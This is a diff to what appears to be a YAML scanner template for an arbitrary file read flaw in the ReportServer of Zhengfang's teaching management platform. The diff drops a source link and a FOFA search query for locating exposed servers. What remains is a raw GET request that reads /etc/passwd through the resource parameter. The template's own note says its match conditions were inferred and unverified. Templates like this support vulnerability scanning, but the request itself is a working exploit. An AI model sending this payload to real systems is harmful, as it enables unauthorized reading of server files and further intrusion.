@@ -3,14 +3,8 @@ info:
   name: 正方教学管理信息服务平台ReportServer存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gx0h2ta92i7qs3ia
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gx0h2ta92i7qs3ia
-    fofa: body="正方软件股份有限公司" && title="教学管理信息服务平台"
 http:
 - raw:
   - 'GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
